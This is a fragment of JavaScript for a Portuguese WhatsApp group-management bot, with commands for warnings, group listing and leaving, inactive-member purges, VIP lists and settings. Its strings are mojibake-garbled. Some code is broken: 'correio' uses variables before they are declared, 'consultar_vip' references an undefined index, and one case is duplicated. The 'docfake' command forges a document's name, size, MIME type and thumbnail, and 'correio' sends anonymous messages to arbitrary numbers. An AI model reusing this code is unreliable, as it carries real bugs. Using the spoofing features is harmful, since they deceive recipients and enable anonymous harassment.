if(!marc_tds) return reply("VocÃª esqueceu de mencionar o alvo apÃ³s o comando.")
adv = dataGp[0].advertir.map(i => i).indexOf(marc_tds)
if(adv < 0) return reply("Este usuÃ¡rio nÃ£o contÃ©m nenhuma advertÃªncia no grupo.")
dataGp[0].advertir.splice(adv, 1)
setGp(dataGp)
reply("A advertÃªncia do usuÃ¡rio neste grupo foi retirada com sucesso!")
break

//======â‰ (INFOS/EXECUÃ‡ÃƒO/DONO)â‰ =========\\

case 'sairdogp':
if(!SoDono) return reply(mess.onlyOwner())  
if(!q) return reply(`VocÃª deve visualizar o comando ${prefix}listagp e olhar de qual o grupo quer sair, e veja a numeraÃ§Ã£o dele, e sÃ³ digitar\nExemplo: ${prefix}sairdogp 0\nesse comando Ã© para o bot sair do grupo que deseja..`)
var getGroups = await yoko.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
try {
await yoko.sendMessage(ingfoo[q].id, {text: "Irei sair do grupo, por ordem do meu dono, adeus..."}) 
setTimeout(async() => {
await yoko.groupLeave(ingfoo[q].id)
}, 5000)
} catch(erro) {
reply(String(erro))
}
reply("Pronto meu dono, sair do grupo que vocÃª queria, em caso de dÃºvidas acione o comando listagp pra verificar..")
break

case 'listagp':
if(!SoDono && !isnit && !info.key.fromMe) return reply(mess.onlyOwner())
var getGroups = await yoko.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
teks1 = `[Total: *${ingfoo.length}*] - Lista de Grupos e comunidades que estou atualmente:\nâ€”\n`
for (let i = 0; i < ingfoo.length; i++) {
var metadt = await yoko.groupMetadata(ingfoo[i].id);
try {
var linkdogp = await yoko.groupInviteCode(ingfoo[i].id)
} catch {
var linkdogp = "NÃ£o foi possivel puxar o link."
}
teks1 += `( ${i+1} ) - Nome do Grupo: ${ingfoo[i].subject}\nID: ${ingfoo[i].id}\nLink do Grupo: https://chat.whatsapp.com/${linkdogp}\nCriado por: ${metadt.subjectOwner}\nCriado em: ${moment(`${ingfoo[i].creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}\nTotal de Participantes: ${ingfoo[i].participants.length}\nâ€”\n`
}
reply(teks1)
break

case 'atividade':
case 'atividades':
try{
if(!isGroupAdmins && !issupre && !ischyt) return reply(mess.onlyAdmins())
if(isGroup && JSON.stringify(countMessage).includes(from)) {
var i6 = countMessage.map(i => i.groupId).indexOf(from)
if(countMessage[i6].numbers.length == 0) return
teks = `*Atividade dos membros do grupo:*\nâ€“\n`
for(i = 0; i < countMessage[i6].numbers.length; i++) {
var i8 = countMessage[i6].numbers.map(i => i.id).indexOf(countMessage[i6].numbers[i].id)  
var uscnt = countMessage[i6].numbers[i]
teks += `â€¢ Participante: *@${uscnt.id.split('@')[0]}*\nâ€¢ Quantidade de comandos usados pelo(a) participante no grupo: *${uscnt.cmd_messages}*\nâ€¢ Quantidade de mensagens enviadas pelo(a) participante: *${uscnt.messages}*\nâ€¢ O participante no momento estÃ¡ conectado em: *${uscnt.aparelho}*\nâ€¢ Quantidade de figurinhas enviadas no grupo: *${uscnt.figus}*\nâ€“\n`
}
await mention(teks)
} else return reply('*Nada foi encontrado*')
} catch(error) {
console.log(error)
}
break

case 'inativos':
case 'inativo':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(q.match(/[a-z]/i) || !q) return reply(`Exemplo: ${prefix+command} 0\nIsso mostrarÃ¡ quantas pessoas tem 0 mensagens no grupo, e se usar 5, vai mostrar quantos usuÃ¡rios tem 5 mensagens ou menos..`)
await ClearMembersInactive()
var i2 = countMessage?.map(x => x.groupId)?.indexOf(from)
blue = []; for (i of countMessage[i2].numbers) {
if(i.messages <= q.trim())
if(i.figus <= q.trim())
if(i.cmd_messages <= q.trim())
if(!groupAdmins.includes(i.id))
if(!numerodono.includes(i.id))
if(i.id != botNumber)
if(groupMembers.map(i => i.id).includes(i.id))
blue.push(i.id)}; for ( i of countMessage[i2].numbers) {
if(!groupMembers.map(i => i.id).includes(i.id))
if(i.id.length > 5)
blue.push(i.id)}
if(blue.length == 0) return reply(`NÃ£o tem pessoas com ${q} mensagens..`)
bli = `UsuÃ¡rios com *${q.trim()}* mensagem(ns) pra baixo estÃ£o listados abaixo, verifique:\nâ€“\n`
for (ac = 0; ac < blue.length; ac++) {
bli += `*${ac+1}.* @${blue[ac].split("@")[0]}\n`
}
await mention(bli)
break

case 'banghost':
if(!isGroup) return reply(mess.onlyGroup())  
if(!SoDono) return reply(mess.onlyOwner())
if(q.match(/[a-z]/i) || !q || q.length > 3) return reply(`Digite a partir de quantas mensagens pra baixo vocÃª deseja remover (que nÃ£o interaje no grupo).\nExemplo: ${prefix+command} 0`)
var i2 = countMessage?.map(x => x.groupId)?.indexOf(from)
blue = []; for (i of countMessage[i2].numbers) {
if(i.messages <= Number(q.trim()))
if(i.figus <= Number(q.trim()))
if(i.cmd_messages <= Number(q.trim()))
if(!groupAdmins.includes(i.id))
if(!numerodono.includes(i.id))
if(i.id != botNumber)
if(groupMembers.map(i => i.id).includes(i.id))
blue.push(i.id)}; for ( i of countMessage[i2].numbers) {
if(!groupMembers.map(i => i.id).includes(i.id))
if(i.id.length > 5)
blue.push(i.id)}
if(blue.length == 0) return reply(`NÃ£o tem mais pessoas com ${q.trim()} mensagem(ns) para eu remover..`)
for ( i = 0; i < blue.length; i++) {
await sleep(1000)
await yoko.groupParticipantsUpdate(from, [blue[i]], "remove")}
break

case 'envpv':
case 'pv':{
if(!isGroup) return reply("Somente em grupos!")
if(!menc_prt) return reply("Marque uma mÃ­dia ou uma mensagem, para que eu possa-lhe enviar em seu privado o que for pedido.")
var DFC = "";
var rsm = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
var pink = isQuotedImage ? rsm?.imageMessage: info.message?.imageMessage
var blue = isQuotedVideo ? rsm?.videoMessage: info.message?.videoMessage
var purple = isQuotedDocument ? rsm?.documentMessage: info.message?.documentMessage
var yellow = isQuotedDocW ? rsm?.documentWithCaptionMessage?.message?.documentMessage: info.message?.documentWithCaptionMessage?.message?.documentMessage
var aud_d = isQuotedAudio ? rsm.audioMessage : ""
var figu_d = isQuotedSticker ? rsm.stickerMessage : ""
var red = isQuotedMsg && !aud_d && !figu_d && !pink && !blue&& !purple && !yellow? rsm.conversation: info.message?.conversation
var green = rsm?.extendedTextMessage?.text || info?.message?.extendedTextMessage?.text
if(pink && !aud_d && !purple) {
var DFC = pink
pink.caption = q.length > 1 ? "Ã‰ o Ayanokoji â¤ï¸" :pink.caption.replace(new RegExp(prefix+command, "gi"), `Ã‰ o Ayanokoji â¤ï¸`)
pink.image = {url: pink.url}
} else if(blue && !aud_d && !purple) {
var DFC = blue  
blue.caption = q.length > 1 ? "Ã‰ o Ayanokoji â¤ï¸"+q.trim() :blue.caption.replace(new RegExp(prefix+command, "gi"), `Ã‰ o Ayanokoji â¤ï¸`).trim()
blue.video = {url: blue.url}
} else if(red && !aud_d && !purple) {
yoko = {}
yoko.text = red.replace(new RegExp(prefix+command, "gi"), `Ã‰ o Ayanokoji â¤ï¸`).trim()
var DFC = yoko
} else if(!aud_d && !figu_d && green && !purple && !purple) {
yoko = {}
yoko.text = green.replace(new RegExp(prefix+command, "gi"), `Ã‰ o Ayanokoji â¤ï¸`).trim()
var DFC = yoko
} else if(purple) {
var DFC = purple
purple.document = {url: purple.url}
} else if(yellow && !aud_d) {
var DFC = yellow 
yellow.caption = q.length > 1 ? "Ayanokoji â¤ï¸"+q.trim() :yellow.caption.replace(new RegExp(prefix+command, "gi"), `Ã‰ o Ayanokoji â¤ï¸`).trim()
yellow.document = {url: yellow.url}
} else if(figu_d && !aud_d) {
var DFC = figu_d
figu_d.sticker = {url: figu_d.url}
} else if(aud_d) {
var DFC = aud_d
aud_d.audio = {url: aud_d.url}
aud_d.ptt = true
}
reply("mandei, olha meu privado. â¤ï¸")
await yoko.sendMessage(sender, DFC, {quoted: info}).catch(e => {
console.log(e)
})
}
break

case 'correio':
txt0 = args.join(" ")
if(!txt1) return reply(mess.syntaxAnonymousMail(prefix))
let txt1 = txt.split("/")[0].replace(/\D/g,'');
let txt2 = txt.split("/")[1];
if(!txt1) return reply('*CadÃª o nÃºmero do destinatÃ¡rio?*')
if(!txt2) return reply('*CadÃª a mensagem para ser enviada ao destinatÃ¡rio?*')
let [result] = await yoko.onWhatsApp(txt1)
if(!result) return reply(`O nÃºmero fornecido estÃ¡ indisponÃ­vel no WhatsApp! Verifique por favor.`)
await reagir(from, "ğŸ’Œï¸")
reply(mess.sucessAnonymousMail())
await yoko.sendMessage(result.jid, {text: mess.anonymousMail(txt0)}).catch(async(error) => {
return reply("Error ao encaminhar a mensagem, tente novamente mais tarde!")
})
break

case 'nome-bot':
if(!SoDono  && !isnit && !info.key.fromMe) return reply(mess.onlyOwner())  
setting.NomeDoBot = q.trim()
fs.writeFileSync('./yoko/configs/settings.json', JSON.stringify(setting, null, 2))
reply(`O nome do bot foi alterado com sucesso para: ${setting.NomeDoBot}`)
break

case 'nick-dono':
if(!SoDono  && !isnit && !info.key.fromMe) return reply(mess.onlyOwner()) 
setting.ownerName = q.trim()
fs.writeFileSync('./yoko/configs/settings.json', JSON.stringify(setting, null, 2))
reply(`O nick do dono foi configurado para: ${setting.ownerName}`)
break

case 'numero-dono':
if(!SoDono && !isnit && !info.key.fromMe) return reply(mess.onlyOwner())  
if(q.match(/[a-z]/i)) return reply("Ã‰ apenas nÃºmeros..")
setting.ownerNumber = q.trim().replace(new RegExp("[()+-/ +/]", "gi"), "");
fs.writeFileSync('./yoko/configs/settings.json', JSON.stringify(setting, null, 2))
reply(`O nÃºmero dono foi configurado com sucesso para: ${q}`)
break

case 'prefixo-bot': case 'setprefix':
if(args.length < 1) return
if(!SoDono  && !isnit && !info.key.fromMe) return reply(mess.onlyOwner())
setting.prefix = q.trim()
fs.writeFileSync('./yoko/configs/settings.json', JSON.stringify(setting, null, 2))
reply(`O prefixo foi alterado com sucesso para: ${setting.prefix}`)
break

case 'fotomenu':
case 'fundomenu':
if(!SoDono) return reply(mess.onlyOwner())
if(!isQuotedImage) return reply("Marque uma imagem")
if((isMedia && !info.message.videoMessage || isQuotedImage) && !q.length <= 1) { 
reply(`Calma ae amigo(a), jÃ¡ estou trocando a foto do menu para vocÃª..`)
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
ftmenu.logo.splice([])
fs.writeFileSync('./yoko/configs/logos.json', JSON.stringify(ftmenu, null, 2))
setTimeout(async() => {
ftmenu.logo.push(res)
fs.writeFileSync('./yoko/configs/logos.json', JSON.stringify(ftmenu, null, 2))
reply(`A foto do menu foi alterada com sucesso para: *${ftmenu.logo}*`)
}, 1200)
} else {
reply(`Mande uma imagem com o comando ${prefix + command} para trocar a foto de todos menu..`)
}
break

case 'setprefix':
if(args.length < 1) return
if(!SoDono && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(mess.onlyOwner())
setting.prefix = q
fs.writeFileSync('./yoko/configs/settings.json', JSON.stringify(setting, null, 2))
reply(`O prefixo foi alterado com sucesso para: ${q}`)
break

case 'wprivacyph':
if(!SoDono) return reply(mess.onlyOwner())
if(args.length < 1) return reply(`ğŸ¤” Hmm, vocÃª parece que estÃ¡ usando de forma errada senhor(a)!\n- Saiba o uso detalhado, atravÃ©s do argumento: _${prefix}wprivacyph *--help*_`);
if (args[0] === '--help') return await mention(mess.helpPhotoPrivacy(prefix, sender));
if (args[0] === '-all') {
reply(`A minha foto do perfil agora estÃ¡ visÃ­vel Ã  todos.`);
await yoko.updateProfilePicturePrivacy('all')
} else if (args[0] === '-cntt') {
reply(`A minha foto do perfil agora estÃ¡ visÃ­vel somente aos meus contatos.`);
await yoko.updateProfilePicturePrivacy('contacts')
} else if (args[0] === '-noall') {
reply(`A foto do meu perfil estÃ¡ privada a todos, atÃ© mesmo ao senhor mestre.`);
await yoko.updateProfilePicturePrivacy('none')
} else {
reply(`ğŸ¤” Hmm, vocÃª parece que estÃ¡ usando de forma errada senhor(a)!\n- Saiba o uso detalhado, atravÃ©s do argumento: _${prefix}wprivacyph *--help*_`);
}
break

case 'wprivacygp':
if(!SoDono) return reply(mess.onlyOwner())
if(args.length < 1) return reply(`ğŸ¤” Hmm, vocÃª parece que estÃ¡ usando de forma errada senhor(a)!\n- Saiba o uso detalhado, atravÃ©s do argumento: _${prefix}wprivacygp *--help*_`);
if (args[0] === '--help') return await mention(mess.helpGroupPrivacy(prefix, sender));
if (args[0] === '-all') {
reply(`Pronto, agora todos pode me adicionar em grupo normalmente.`)
await yoko.updateGroupsAddPrivacy(`all`)
} else if (args[0] === '-cntt') {
reply(`Agora somente meus contatos, pode me adicionar em grupo.`)
await yoko.updateGroupsAddPrivacy(`contacts`)
} else if (args[0] === '-noall') {
reply(`Agora ninguÃ©m pode ousar me adicionar em grupo, pois serÃ¡ negado.`)
await yoko.updateGroupsAddPrivacy('none')
} else {
reply(`ğŸ¤” Hmm, vocÃª parece que estÃ¡ usando de forma errada senhor(a)!\n- Saiba o uso detalhado, atravÃ©s do argumento: _${prefix}wprivacygp *--help*_`);
}
break

case 'nomegp':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
await yoko.groupUpdateSubject(from, `${body.slice(9)}`)
await yoko.sendMessage(from, {text: 'Sucesso, alterou o nome do grupo.'}, {quoted: selo})
break

case 'envmsg':
if(!SoDono && !isnit) return reply(mess.onlyOwner())
var [tx1, tx2] = q.split("/")
await yoko.sendMessage(tx1, {text: tx2})
break

case 'dono1':
if(args.length < 1) return
if(!SoDono  && !isnit && !issupre && !ischyt) return reply(mess.onlyOwner())
nescessario.numero_dono1 = q.trim()
setNes(nescessario)
reply(`Agora contem um segundo dono(a) alterado com sucesso para: ${q}`)
break

case 'dono2':
if(args.length < 1) return
if(!SoDono  && !isnit && !issupre && !ischyt) return reply(mess.onlyOwner())
nescessario.numero_dono2 = q.trim()
setNes(nescessario)
reply(`Agora contem um segundo dono(a) alterado com sucesso para: ${q}`)
break

case 'dono3':
if(args.length < 1) return
if(!SoDono  && !isnit && !issupre && !ischyt) return reply(mess.onlyOwner())
nescessario.numero_dono3 = q.trim()
setNes(nescessario)
reply(`Agora contem um terceiro dono(a) alterado com sucesso para: ${q}`)
break

case 'dono4':
if(args.length < 1) return
if(!SoDono  && !isnit && !issupre && !ischyt) return reply(mess.onlyOwner())
nescessario.numero_dono4 = q.trim()
setNes(nescessario)
reply(`Agora contem um quarto dono(a) alterado com sucesso para: ${q}`)
break

case 'dono5':
if(args.length < 1) return
if(!SoDono  && !isnit && !issupre && !ischyt) return reply(mess.onlyOwner())
nescessario.numero_dono5 = q.trim()
setNes(nescessario)
reply(`Agora contem um quinto dono(a) alterado com sucesso para: ${q}`)
break

case 'dono6':
if(args.length < 1) return
if(!SoDono  && !isnit && !issupre && !ischyt) return reply(mess.onlyOwner())
nescessario.numero_dono6 = q.trim()
setNes(nescessario)
reply(`Agora contem um quinto dono(a) alterado com sucesso para: ${q}`)
break

case 'getquoted':
reply(JSON.stringify(info.message.extendedTextMessage.contextInfo, null, 3))
break

case 'donos':
reply(mess.ownersList(NomeDoBot, numerodono_ofc, numero_dono1, numero_dono2, numero_dono3, numero_dono4, numero_dono5, numero_dono6))
break

case 'admins':
case 'listadmins':  
case 'listaadmins':   
if(!isGroup) return reply(mess.onlyGroup())
ytb = `Lista de admins do grupo *${groupMetadata.subject}*\n*Total de Adminstradores:* ${groupAdmins.length}\n-\n`
no = 0
for (let admon of groupAdmins) {
no += 1
ytb += `( ${no.toString()} ) - @${admon.split('@')[0]}\n`
}
await mentions(ytb, groupAdmins, true)
break

case 'ativo': case 'on': case 'voltei':
if(!isGroupAdmins && !SoDono) return reply("SÃ³ adm ou dono pode utilizar este comando.")
if(DonoOficial) {
if(fs.existsSync("./yoko/bunker/database/func/afk/afk-@" + numerodono_ofc + ".json")) {  
DLT_FL("./yoko/bunker/database/func/afk/afk-@" + numerodono_ofc + ".json");
reply("Bem vindo de volta, agora vocÃª estÃ¡ online ğŸ™‚")
} else {
reply("VocÃª nÃ£o registrou nenhuma mensagem de ausÃªncia...")
}
} else if(isGroupAdmins) {
if(!JSON.stringify(dataGp[0].ausentes).includes(sender)) return reply("NÃ£o hÃ¡ nenhum registro de ausÃªncia sua..")
dataGp[0].ausentes.splice(dataGp[0].ausentes.map(x => x.id).indexOf(sender), 1)
setGp(dataGp)
reply("Registro de ausÃªncia tirada com sucesso...")
}
break

case 'ausente': case 'off': case 'afk':
if(!isGroupAdmins && !SoDono) return reply("SÃ³ adm ou dono pode utilizar este comando.")
if(DonoOficial) {
msgtmp = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
fs.writeFileSync(`./yoko/bunker/database/func/afk/afk-@${setting.ownerNumber.replace(new RegExp("[()+-/ +/]", "gi"), "")}.json`, JSON.stringify({Ausente_Desde: msgtmp, Motivo_Da_AusÃªncia: q}, null, 2));
reply(`Mensagem de ausÃªncia criada com sucesso...`)
} else if(isGroupAdmins) {
if(!q.trim()) return reply(`Digite a mensagem de ausÃªncia, Exemplo: ${prefix+command} Estou tomando banho`)
if(!JSON.stringify(dataGp[0].ausentes).includes(sender)) {
dataGp[0].ausentes.push({id: sender, msg: q.trim()})
setGp(dataGp)
reply("Mensagem de ausÃªncia criada com sucesso..\nSe deseja desativar a mensagem de ausÃªncia use o comando ativo")
} else {
dataGp[0].ausentes[dataGp[0].ausentes.map(i => i.id).indexOf(sender)].msg = q.trim()
setGp(dataGp)
reply("Mensagem de ausÃªncia alterada com sucesso..\nSe deseja desativar a mensagem de ausÃªncia use o comando ativo")
}
} else {
return reply("Comando apenas para administradores e dono do bot..")
}
break

case 'addvip': 
if(!SoDono) return reply(mess.onlyOwner())
barra = q.replace(" /", "/").replace("/ ", "/").replace(" / ", "/")
var [nmr, tempo50] = barra.split('/')
if(!nmr || !tempo50) return await mention(`VocÃª esqueceu de colocar o nÃºmero do indivÃ­duo e a quantidade de dias que o(a) usuÃ¡rio(a) como vip.\nâ€¢ Segue o exemplo de uso correto do comando: *${prefix+command} @${nmrdn.split('@')[0]}/30*\nâ€“â€“â€“\nâ€¢ Para colocar o usuÃ¡rio sem duraÃ§Ã£o de expiraÃ§Ã£o do vip, vocÃª usa o *0* como quantidade de dias.`)
usur = nmr.includes('@') ? nmr.split('@')[1] + "@s.whatsapp.net" : nmr + "@s.whatsapp.net"
mega = Number(tempo50) > 0 ? false : true
dvip = moment.tz('America/Sao_Paulo').format('DD')
bla = JSON.stringify(vip).includes(usur)
if(bla) {
AB = vip.map(i => i.id).indexOf(usur)
if(vip[AB].infinito == true) return reply(`NÃ£o Ã© possÃ­vel adicionar + dias ao usuÃ¡rio, por motivos que ele contÃ©m o vip infinito.`)
vip[AB].dias += Number(tempo50)
fs.writeFileSync('./yoko/bunker/database/usuarios/vip.json', JSON.stringify(vip))
await yoko.sendMessage(from, {text: `${tempo50} dia${Number(tempo50) > 1 ? `s` : ``} fo${Number(tempo50) > 1 ? `ram` : `i`} adicionado${Number(tempo50) > 1 ? `s` : ``} ao usuÃ¡rio @${usur.split("@")[0]}`, mentions: [usur]}, {quoted: selo})
} else {
vip.push({id: usur, dias: Number(tempo50), save: Number(dvip), infinito: mega})
fs.writeFileSync('./yoko/bunker/database/usuarios/vip.json', JSON.stringify(vip))
await yoko.sendMessage(from, {text: `${Number(tempo50) > 0 ? `@${usur.split("@")[0]} foi adicionado Ã  lista vip com sucesso!` : `@${usur.split("@")[0]} foi agraciado com o benefÃ­cio do vip infinito!`}`, mentions: [usur]}, {quoted: selo})
}
break

case 'delvip':
if(!SoDono) return reply(mess.onlyOwner())
if(!marc_tds) return reply(`Marque o usuÃ¡rio que deseja remover da lista vip.ï¸`)
if(!JSON.stringify(vip).includes(marc_tds)) return reply("Este nÃºmero nÃ£o estÃ¡ incluso atualmente na lista de usuÃ¡rios vip(s)..")
AB = vip.map(i => i.id).indexOf(marc_tds)
vip.splice(AB, 1)
fs.writeFileSync('./yoko/bunker/database/usuarios/vip.json', JSON.stringify(vip))
await yoko.sendMessage(from, {text: `@${marc_tds.split("@")[0]} foi removido da lista vip com sucesso!`, mentions: [marc_tds]}, {quoted: selo})
break

case 'consultar_vip':
if(!JSON.stringify(vip).includes(sender)) return reply("VocÃª nÃ£o estÃ¡ incluso atualmente na lista de usuÃ¡rios vip(s)..")
AB = vip.map(i => i.id).indexOf(sender)
await mention(`UsuÃ¡rio: @${vip[AB].id.split('@')[0]}\nâ€¢ ExpiraÃ§Ã£o: ${vip[AAB].infinito == false ? `*Seu vip irÃ¡ expirar em ${vip[AB].dias} dia${vip[AB].dias > 1 ? `s` : ``}.*` : `*NÃ£o existe um dia de expiraÃ§Ã£o do seu vip.*`}`)
break

case 'viplist':
if(vip.length == 0) return reply(`Existe *0* user(s) vip(s), ou seja, nÃ£o existe ninguÃ©m.`)
tkks = `[Total: *${vip.length}*] - Lista de usuÃ¡rio(s) vip temporÃ¡rio(s)/infinito(s):\nâ€“\n`
tkks += vip.map((v, index) =>  `*[${index+1}]* - UsuÃ¡rio: @${v.id.split('@')[0]}\nâ€¢ ExpiraÃ§Ã£o: ${v.infinito == false ? `*O vip do usuÃ¡rio expira em ${v.dias} dia${v.dias > 1 ? `s` : ``}.*` : `*NÃ£o existe um dia de expiraÃ§Ã£o do vip do usuÃ¡rio.*`}`).join('\nâ€“â€“\n')
await mention(tkks)
break

case 'limpar':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
clear = `ğŸ—‘ï¸\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nğŸ—‘ï¸\nâ²â—â³ *LÉªá´á´˜á´‡á´¢á´€ á´…á´‡ CÊœá´€á´› Cá´É´á´„ÊŸá´œÉªÌá´…á´€* âœ…`
await yoko.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
break

case 'd_':
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.message.buttonsResponseMessage.contextInfo.stanzaId, participant: botNumber}})
break

/*
case 'envpv':
case 'pv':{
if(!isGroup) return reply("Somente em grupos!")
if(!menc_prt) return reply("Marque uma mÃ­dia ou uma mensagem, para que eu possa-lhe enviar em seu privado o que for pedido.")
var DFC = "";
var rsm = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
var pink = isQuotedImage ? rsm?.imageMessage: info.message?.imageMessage
var blue = isQuotedVideo ? rsm?.videoMessage: info.message?.videoMessage
var purple = isQuotedDocument ? rsm?.documentMessage: info.message?.documentMessage
var yellow = isQuotedDocW ? rsm?.documentWithCaptionMessage?.message?.documentMessage: info.message?.documentWithCaptionMessage?.message?.documentMessage
var aud_d = isQuotedAudio ? rsm.audioMessage : ""
var figu_d = isQuotedSticker ? rsm.stickerMessage : ""
var red = isQuotedMsg && !aud_d && !figu_d && !pink && !blue&& !purple && !yellow? rsm.conversation: info.message?.conversation
var green = rsm?.extendedTextMessage?.text || info?.message?.extendedTextMessage?.text
if(pink && !aud_d && !purple) {
var DFC = pink
pink.caption = q.length > 1 ? "Prontinho  â™¦ï¸ğŸ«¡" :pink.caption.replace(new RegExp(prefix+command, "gi"), `Prontinho  â™¦ï¸ğŸ«¡`)
pink.image = {url: pink.url}
} else if(blue && !aud_d && !purple) {
var DFC = blue  
blue.caption = q.length > 1 ? "Prontinho  â™¦ï¸ğŸ«¡"+q.trim() :blue.caption.replace(new RegExp(prefix+command, "gi"), `Prontinho  â™¦ï¸ğŸ«¡`).trim()
blue.video = {url: blue.url}
} else if(red && !aud_d && !purple) {
black = {}
black.text = red.replace(new RegExp(prefix+command, "gi"), `Prontinho  â™¦ï¸ğŸ«¡`).trim()
var DFC = black
} else if(!aud_d && !figu_d && green && !purple && !purple) {
brown = {}
brown.text = green.replace(new RegExp(prefix+command, "gi"), `Prontinho  â™¦ï¸ğŸ«¡`).trim()
var DFC = brown
} else if(purple) {
var DFC = purple
purple.document = {url: purple.url}
} else if(yellow && !aud_d) {
var DFC = yellow 
yellow.caption = q.length > 1 ? "Prontinho  â™¦ï¸ğŸ«¡"+q.trim() :yellow.caption.replace(new RegExp(prefix+command, "gi"), `Prontinho  â™¦ï¸ğŸ«¡`).trim()
yellow.document = {url: yellow.url}
} else if(figu_d && !aud_d) {
var DFC = figu_d
figu_d.sticker = {url: figu_d.url}
} else if(aud_d) {
var DFC = aud_d
aud_d.audio = {url: aud_d.url}
aud_d.ptt = true
}
reply("mandei, olha meu privado. ğŸ’")
await yoko.sendMessage(sender, DFC, {quoted: selo}).catch(e => {
console.log(e)
})
}
break
*/

case 'doc':
case 'docfake':
try {
sprd = "|"
if(!q) return reply(`${prefix + command} exemplo${sprd}500${sprd}apk\n-\nOs tipos aceitos por enquanto sÃ£o: pdf > xml > zip > jpg > ppt > apk > txt > aac > pptx > aac > m4a > mp4 > mp3 > svg > png`)
kls = args.join(' ')
let nomedoc = kls.split(sprd)[0] || `${setting.NomeDoBot}`
let peso = kls.split(sprd)[1] * 1000000 || '1000000'
let mimetyp = kls.split(sprd)[2].replace(" ", "") || 'gif'
let thumbc = kls.split(sprd)[3] || 'https://google.com/'
if(mimetyp.toLowerCase() == 'pdf') mimetyp = 'application/pdf'
if(mimetyp.toLowerCase() == 'apk') mimetyp = 'application/vnd.android.package-archive'
if(mimetyp.toLowerCase() == 'aac') mimetyp = 'audio/aac'
if(mimetyp.toLowerCase() == 'xml') mimetyp = 'application/xml'
if(mimetyp.toLowerCase() == 'zip') mimetyp = 'application/zip'
if(mimetyp.toLowerCase() == 'jpg') mimetyp = 'image/jpeg'
if(mimetyp.toLowerCase() == 'ppt') mimetyp = 'application/vnd.ms-powerpoint'
if(mimetyp.toLowerCase() == 'pptx') mimetyp = 'application/vnd.openxmlformats-officedocument.presentationml.presentation'
if(mimetyp.toLowerCase() == 'mp4') mimetyp = 'video/mp4'
if(mimetyp.toLowerCase() == 'm4a') mimetyp = 'audio/mpeg'
if(mimetyp.toLowerCase() == 'mp3') mimetyp = 'audio/mpeg'
if(mimetyp.toLowerCase() == 'gif') mimetyp = 'image/gif'
if(mimetyp.toLowerCase() == 'png') mimetyp = 'image/png'
if(mimetyp.toLowerCase() == 'svg') mimetyp = 'image/svg+xml'
if(mimetyp.toLowerCase() == 'txt') mimetyp = 'text/plain'
let Messagemdoc = {document: fs.readFileSync('./yoko/bunker/database/data/docf.txt'), mimetype: mimetyp, jpegThumbnail: await getBuffer(thumbc), fileName: nomedoc, fileLength: peso, headerType: 4, contextInfo:{forwardingScore:999,isForwarded:true}}
await yoko.sendMessage(from, Messagemdoc, {quoted: selo})
} catch (err) {
console.log(err)
reply(mess.error())
}
break

case 'deletar': case 'delete': case 'del':  case 'd':
if(!menc_prt) return reply("Marque a mensagem do usuÃ¡rio que deseja apagar, do bot ou de alguÃ©m.")
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.message.extendedTextMessage.contextInfo.stanzaId, participant: menc_prt}})
break

case 'fundobemvindo':
case 'fundobv':  
if(!SoDono && !isnit && !info.key.fromMe) return reply(mess.onlyOwner())
if(!isQuotedImage) return reply("Marque uma imagem..")
reply('VocÃª deve marcar uma imagem com esse comando, se nÃ£o for de primeira, tente novamente, ok? ')
if((isMedia && !info.message.videoMessage || isQuotedImage || isQuotedVideo ) && !q.length <= 1) {
boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
logoslink.fundo1 = res
fs.writeFileSync("./yoko/configs/links_img.json", JSON.stringify(logoslink, null, 2));
reply(`A imagem de bem vindo foi alterado com sucesso para: ${res}`)
}
break

case 'fundolevel':
if(!SoDono && !isnit && !info.key.fromMe) return reply(mess.onlyOwner())
if(!isQuotedImage) return reply("Marque uma imagem..")
reply('VocÃª deve marcar uma imagem com esse comando, se nÃ£o for de primeira, tente novamente, ok? ')
if((isMedia && !info.message.videoMessage || isQuotedImage || isQuotedVideo ) && !q.length <= 1) {
boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
logoslink.fundolevel = res
fs.writeFileSync("./yoko/configs/links_img.json", JSON.stringify(logoslink, null, 2));
reply(`A imagem de fundo-level foi alterado com sucesso para: ${res}`)
}
break

